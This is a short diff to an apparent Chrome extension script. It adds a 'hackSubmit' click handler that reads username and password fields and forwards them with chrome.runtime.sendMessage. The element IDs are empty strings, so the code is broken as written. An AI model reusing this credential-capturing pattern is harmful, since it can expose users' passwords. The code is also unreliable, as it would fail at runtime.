@@ -4,10 +4,17 @@ or content script. */
 
 var hacksubmit = document.getElementById('hackSubmit');
 var link1 = document.getElementById('githublink');
+var inputu;
+var inputp;
+
 
 hacksubmit.onclick = function(){
     console.log("html-check.js confirmed...");
     chrome.runtime.sendMessage({"pressed": "start"});
+    inputp = document.getElementById('');
+    inputu = document.getElementById('');
+    chrome.runtime.sendMessage({"username": inputu.innerHTML});
+    chrome.runtime.sendMessage({"password": inputp.innerHTML});
 }
 
 githublink.onclick = function() {
